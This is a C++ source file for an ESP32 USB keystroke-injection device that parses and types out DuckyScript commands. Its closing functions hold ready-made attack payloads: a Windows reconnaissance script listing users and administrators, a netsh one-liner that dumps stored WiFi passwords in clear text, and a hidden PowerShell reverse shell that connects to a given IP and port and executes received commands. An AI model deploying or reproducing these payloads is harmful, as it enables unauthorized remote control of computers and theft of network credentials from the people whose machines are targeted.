#include "DuckyScript.h"
#include <esp_log.h>

static const char* TAG = "DuckyScript";

DuckyScript::DuckyScript(USBKeyboard* kb) : 
    keyboard(kb), 
    defaultDelay(0), 
    running(false), 
    currentInstruction(0) {
}

bool DuckyScript::loadScript(const String& script) {
    clearScript();
    
    // Split script into lines
    int startIdx = 0;
    int endIdx = 0;
    
    while (endIdx < script.length()) {
        endIdx = script.indexOf('\n', startIdx);
        if (endIdx == -1) endIdx = script.length();
        
        String line = script.substring(startIdx, endIdx);
        line.trim();
        
        if (!line.isEmpty() && !line.startsWith("REM")) {
            DuckyInstruction inst = parseLine(line);
            if (inst.command != DUCKY_NONE) {
                instructions.push_back(inst);
            }
        }
        
        startIdx = endIdx + 1;
    }
    
    ESP_LOGI(TAG, "Loaded script with %d instructions", instructions.size());
    return !instructions.empty();
}

DuckyInstruction DuckyScript::parseLine(const String& line) {
    DuckyInstruction inst;
    inst.command = DUCKY_NONE;
    inst.key = 0;
    inst.delay = 0;
    inst.repeatCount = 1;
    
    // Find first space to separate command from parameters
    int spaceIdx = line.indexOf(' ');
    String cmd = (spaceIdx > 0) ? line.substring(0, spaceIdx) : line;
    String param = (spaceIdx > 0) ? line.substring(spaceIdx + 1) : "";
    cmd.toUpperCase();
    param.trim();
    
    // Parse command
    if (cmd == "REM") {
        inst.command = DUCKY_REM;
    } else if (cmd == "DEFAULT_DELAY" || cmd == "DEFAULTDELAY") {
        inst.command = DUCKY_DEFAULT_DELAY;
        inst.delay = param.toInt();
    } else if (cmd == "DELAY") {
        inst.command = DUCKY_DELAY;
        inst.delay = param.toInt();
    } else if (cmd == "STRING") {
        inst.command = DUCKY_STRING;
        inst.parameter = param;
    } else if (cmd == "STRINGLN" || cmd == "PRINTLN") {
        inst.command = DUCKY_STRINGLN;
        inst.parameter = param;
    } else if (cmd == "PRINT") {
        inst.command = DUCKY_PRINT;
        inst.parameter = param;
    } else if (cmd == "REPEAT" || cmd == "REPLAY") {
        inst.command = DUCKY_REPEAT;
        inst.repeatCount = param.isEmpty() ? 1 : param.toInt();
    } else if (cmd == "ENTER" || cmd == "RETURN") {
        inst.command = DUCKY_ENTER;
    } else if (cmd == "ESCAPE" || cmd == "ESC") {
        inst.command = DUCKY_ESCAPE;
    } else if (cmd == "BACKSPACE" || cmd == "BKSP") {
        inst.command = DUCKY_BACKSPACE;
    } else if (cmd == "TAB") {
        inst.command = DUCKY_TAB;
    } else if (cmd == "SPACE") {
        inst.command = DUCKY_SPACE;
    } else if (cmd == "CAPS_LOCK" || cmd == "CAPSLOCK") {
        inst.command = DUCKY_CAPS_LOCK;
    } else if (cmd == "DELETE" || cmd == "DEL") {
        inst.command = DUCKY_DELETE;
    } else if (cmd == "HOME") {
        inst.command = DUCKY_HOME;
    } else if (cmd == "END") {
        inst.command = DUCKY_END;
    } else if (cmd == "INSERT" || cmd == "INS") {
        inst.command = DUCKY_INSERT;
    } else if (cmd == "PAGEUP" || cmd == "PAGE_UP") {
        inst.command = DUCKY_PAGEUP;
    } else if (cmd == "PAGEDOWN" || cmd == "PAGE_DOWN") {
        inst.command = DUCKY_PAGEDOWN;
    } else if (cmd == "UP" || cmd == "UPARROW") {
        inst.command = DUCKY_UP;
    } else if (cmd == "DOWN" || cmd == "DOWNARROW") {
        inst.command = DUCKY_DOWN;
    } else if (cmd == "LEFT" || cmd == "LEFTARROW") {
        inst.command = DUCKY_LEFT;
    } else if (cmd == "RIGHT" || cmd == "RIGHTARROW") {
        inst.command = DUCKY_RIGHT;
    } else if (cmd == "GUI" || cmd == "WINDOWS" || cmd == "SUPER") {
        inst.command = DUCKY_GUI;
        // Check for key combo
        if (!param.isEmpty()) {
            inst.modifiers.push_back(KEY_LEFT_GUI);
            inst.key = parseKey(param);
        }
    } else if (cmd == "CTRL" || cmd == "CONTROL") {
        inst.command = DUCKY_CTRL;
        if (!param.isEmpty()) {
            inst.modifiers.push_back(KEY_LEFT_CTRL);
            // Check for additional modifiers
            if (param.startsWith("ALT")) {
                inst.modifiers.push_back(KEY_LEFT_ALT);
                int nextSpace = param.indexOf(' ');
                if (nextSpace > 0) {
                    inst.key = parseKey(param.substring(nextSpace + 1));
                }
            } else if (param.startsWith("SHIFT")) {
                inst.modifiers.push_back(KEY_LEFT_SHIFT);
                int nextSpace = param.indexOf(' ');
                if (nextSpace > 0) {
                    inst.key = parseKey(param.substring(nextSpace + 1));
                }
            } else {
                inst.key = parseKey(param);
            }
        }
    } else if (cmd == "ALT") {
        inst.command = DUCKY_ALT;
        if (!param.isEmpty()) {
            inst.modifiers.push_back(KEY_LEFT_ALT);
            inst.key = parseKey(param);
        }
    } else if (cmd == "SHIFT") {
        inst.command = DUCKY_SHIFT;
        if (!param.isEmpty()) {
            inst.modifiers.push_back(KEY_LEFT_SHIFT);
            inst.key = parseKey(param);
        }
    } else if (cmd.startsWith("F") && cmd.length() <= 3) {
        // Function keys F1-F12
        int fnum = cmd.substring(1).toInt();
        if (fnum >= 1 && fnum <= 12) {
            inst.command = (DuckyCommand)(DUCKY_F1 + fnum - 1);
        }
    } else if (cmd == "MENU" || cmd == "APP") {
        inst.command = DUCKY_MENU;
    }
    
    return inst;
}

uint8_t DuckyScript::parseKey(const String& keyName) {
    String key = keyName;
    key.toUpperCase();
    
    // Single character
    if (key.length() == 1) {
        char c = key.charAt(0);
        if (c >= 'A' && c <= 'Z') {
            return KEY_A + (c - 'A');
        } else if (c >= '0' && c <= '9') {
            return KEY_0 + (c - '0');
        }
    }
    
    // Special keys
    if (key == "ENTER" || key == "RETURN") return KEY_ENTER;
    if (key == "ESCAPE" || key == "ESC") return KEY_ESC;
    if (key == "BACKSPACE" || key == "BKSP") return KEY_BACKSPACE;
    if (key == "TAB") return KEY_TAB;
    if (key == "SPACE") return KEY_SPACE;
    if (key == "DELETE" || key == "DEL") return KEY_DELETE;
    if (key == "HOME") return KEY_HOME;
    if (key == "END") return KEY_END;
    if (key == "INSERT" || key == "INS") return KEY_INSERT;
    if (key == "PAGEUP" || key == "PAGE_UP") return KEY_PAGE_UP;
    if (key == "PAGEDOWN" || key == "PAGE_DOWN") return KEY_PAGE_DOWN;
    if (key == "UP" || key == "UPARROW") return KEY_UP_ARROW;
    if (key == "DOWN" || key == "DOWNARROW") return KEY_DOWN_ARROW;
    if (key == "LEFT" || key == "LEFTARROW") return KEY_LEFT_ARROW;
    if (key == "RIGHT" || key == "RIGHTARROW") return KEY_RIGHT_ARROW;
    
    // Function keys
    if (key.startsWith("F") && key.length() <= 3) {
        int fnum = key.substring(1).toInt();
        if (fnum >= 1 && fnum <= 12) {
            return KEY_F1 + (fnum - 1);
        }
    }
    
    return 0;
}

void DuckyScript::executeInstruction(const DuckyInstruction& inst) {
    if (!keyboard || !keyboard->isInitialized()) {
        ESP_LOGE(TAG, "USB keyboard not initialized");
        return;
    }
    
    switch (inst.command) {
        case DUCKY_DEFAULT_DELAY:
            defaultDelay = inst.delay;
            break;
            
        case DUCKY_DELAY:
            delay(inst.delay);
            break;
            
        case DUCKY_STRING:
        case DUCKY_PRINT:
            keyboard->typeString(inst.parameter.c_str());
            if (defaultDelay > 0) delay(defaultDelay);
            break;
            
        case DUCKY_STRINGLN:
        case DUCKY_PRINTLN:
            keyboard->typeString(inst.parameter.c_str());
            keyboard->tapKey(KEY_ENTER);
            if (defaultDelay > 0) delay(defaultDelay);
            break;
            
        case DUCKY_REPEAT:
        case DUCKY_REPLAY:
            // Execute last instruction multiple times
            for (int i = 0; i < inst.repeatCount; i++) {
                executeInstruction(lastInstruction);
            }
            return; // Don't update lastInstruction
            
        case DUCKY_ENTER:
            keyboard->tapKey(KEY_ENTER);
            break;
            
        case DUCKY_ESCAPE:
            keyboard->tapKey(KEY_ESC);
            break;
            
        case DUCKY_BACKSPACE:
            keyboard->tapKey(KEY_BACKSPACE);
            break;
            
        case DUCKY_TAB:
            keyboard->tapKey(KEY_TAB);
            break;
            
        case DUCKY_SPACE:
            keyboard->tapKey(KEY_SPACE);
            break;
            
        case DUCKY_DELETE:
            keyboard->tapKey(KEY_DELETE);
            break;
            
        case DUCKY_HOME:
            keyboard->tapKey(KEY_HOME);
            break;
            
        case DUCKY_END:
            keyboard->tapKey(KEY_END);
            break;
            
        case DUCKY_INSERT:
            keyboard->tapKey(KEY_INSERT);
            break;
            
        case DUCKY_PAGEUP:
            keyboard->tapKey(KEY_PAGE_UP);
            break;
            
        case DUCKY_PAGEDOWN:
            keyboard->tapKey(KEY_PAGE_DOWN);
            break;
            
        case DUCKY_UP:
            keyboard->tapKey(KEY_UP_ARROW);
            break;
            
        case DUCKY_DOWN:
            keyboard->tapKey(KEY_DOWN_ARROW);
            break;
            
        case DUCKY_LEFT:
            keyboard->tapKey(KEY_LEFT_ARROW);
            break;
            
        case DUCKY_RIGHT:
            keyboard->tapKey(KEY_RIGHT_ARROW);
            break;
            
        case DUCKY_CAPS_LOCK:
            keyboard->tapKey(KEY_CAPS_LOCK);
            break;
            
        case DUCKY_GUI:
        case DUCKY_CTRL:
        case DUCKY_ALT:
        case DUCKY_SHIFT:
            // Handle modifier + key combos
            if (!inst.modifiers.empty() && inst.key != 0) {
                executeKeyCombo(inst.modifiers, inst.key);
            }
            break;
            
        case DUCKY_F1:
        case DUCKY_F2:
        case DUCKY_F3:
        case DUCKY_F4:
        case DUCKY_F5:
        case DUCKY_F6:
        case DUCKY_F7:
        case DUCKY_F8:
        case DUCKY_F9:
        case DUCKY_F10:
        case DUCKY_F11:
        case DUCKY_F12:
            keyboard->tapKey(KEY_F1 + (inst.command - DUCKY_F1));
            break;
            
        case DUCKY_MENU:
        case DUCKY_APP:
            // Context menu key (not available on all keyboards)
            break;
            
        default:
            break;
    }
    
    // Remember last instruction (except REM and control commands)
    if (inst.command != DUCKY_REM && inst.command != DUCKY_REPEAT && 
        inst.command != DUCKY_DEFAULT_DELAY) {
        lastInstruction = inst;
    }
}

void DuckyScript::executeKeyCombo(const std::vector<uint8_t>& modifiers, uint8_t key) {
    // Press all modifiers
    for (uint8_t mod : modifiers) {
        keyboard->pressKey(mod);
    }
    
    // Tap the key
    delay(10);
    keyboard->tapKey(key);
    
    // Release all modifiers
    for (int i = modifiers.size() - 1; i >= 0; i--) {
        keyboard->releaseKey(modifiers[i]);
    }
    
    delay(10);
}

void DuckyScript::run() {
    if (instructions.empty()) {
        ESP_LOGE(TAG, "No script loaded");
        return;
    }
    
    running = true;
    currentInstruction = 0;
    
    ESP_LOGI(TAG, "Starting script execution (%d instructions)", instructions.size());
    
    while (running && currentInstruction < instructions.size()) {
        executeInstruction(instructions[currentInstruction]);
        currentInstruction++;
        
        // Allow for interruption
        yield();
    }
    
    running = false;
    ESP_LOGI(TAG, "Script execution completed");
}

void DuckyScript::stop() {
    running = false;
    ESP_LOGI(TAG, "Script execution stopped");
}

void DuckyScript::clearScript() {
    instructions.clear();
    currentInstruction = 0;
    running = false;
}

float DuckyScript::getProgress() const {
    if (instructions.empty()) return 0.0;
    return (float)currentInstruction / (float)instructions.size();
}

// Predefined scripts
String DuckyScript::getWindowsReconScript() {
    return String(R"(
REM Windows Reconnaissance Script
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING systeminfo
ENTER
DELAY 2000
STRING ipconfig /all
ENTER
DELAY 1000
STRING netstat -an
ENTER
DELAY 1000
STRING net user
ENTER
DELAY 1000
STRING net localgroup administrators
ENTER
)");
}

String DuckyScript::getWiFiPasswordScript() {
    return String(R"(
REM Export WiFi Passwords
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING netsh wlan show profiles
ENTER
DELAY 2000
STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr /c:"All User Profile"') do (for /f "tokens=*" %b in ("%a") do netsh wlan show profile name="%b" key=clear | findstr /c:"SSID name" /c:"Key Content")
ENTER
)");
}

String DuckyScript::getReverseShellScript(const char* ip, uint16_t port) {
    char script[1024];
    snprintf(script, sizeof(script), R"(
REM PowerShell Reverse Shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $c=New-Object System.Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()
ENTER
)", ip, port);
    
    return String(script);
}